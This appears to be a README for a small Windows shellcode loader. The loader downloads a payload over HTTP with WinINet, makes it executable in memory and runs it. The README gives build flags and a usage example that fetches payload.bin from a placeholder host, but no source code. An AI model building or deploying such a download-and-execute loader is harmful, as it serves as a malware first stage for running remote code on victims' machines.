# Minimal Windows Shellcode Loader

A minimal Windows shellcode loader that uses only Windows API functions, with no dependencies on the C runtime library (CRT) or standard I/O functions.

## Features

- **Pure Windows API**: No stdio or standard C library functions
- **HTTP Download**: Downloads shellcode from any URL using WinINet API
- **Memory Execution**: Allocates executable memory and runs shellcode
- **Minimal Size**: Optimized for smallest possible binary size
- **No CRT**: Uses custom entry point to avoid C runtime dependency

## Building

### Requirements
- MinGW-w64 or Visual Studio with Windows SDK
- Windows target environment

### Compilation Options

**Default build:**
```cmd
make
```

**32-bit MinGW build:**
```cmd
make mingw
```

**64-bit MinGW build:**
```cmd
make x64
```

**Manual compilation:**
```cmd
gcc -Os -fno-stack-protector -nostdlib -nostartfiles -s -o shellcode_loader.exe shellcode_loader.c -lkernel32 -lwininet
```

## Usage

```cmd
shellcode_loader.exe <URL>
```

Example:
```cmd
shellcode_loader.exe http://example.com/payload.bin
```

## Technical Details

### APIs Used
- **WinINet**: `InternetOpen`, `InternetOpenUrl`, `InternetReadFile`, `InternetCloseHandle`
- **Kernel32**: `VirtualAlloc`, `VirtualProtect`, `VirtualFree`, `GetCommandLine`, `ExitProcess`
- **Memory**: Dynamic buffer allocation with automatic expansion

### Memory Management
1. Downloads shellcode to read/write memory
2. Changes memory protection to executable
3. Executes via function pointer
4. Cleans up all allocated resources

### Security Considerations
This tool is designed for legitimate security research and testing purposes. Ensure you have proper authorization before using with any shellcode or on any systems.

## Code Structure

The loader implements:
- Custom entry point (`WinMainCRTStartup`) to avoid CRT
- Command-line argument parsing
- HTTP download with dynamic buffer management
- Memory protection changes for execution
- Proper resource cleanup

## License

This project is provided for educational and research purposes only.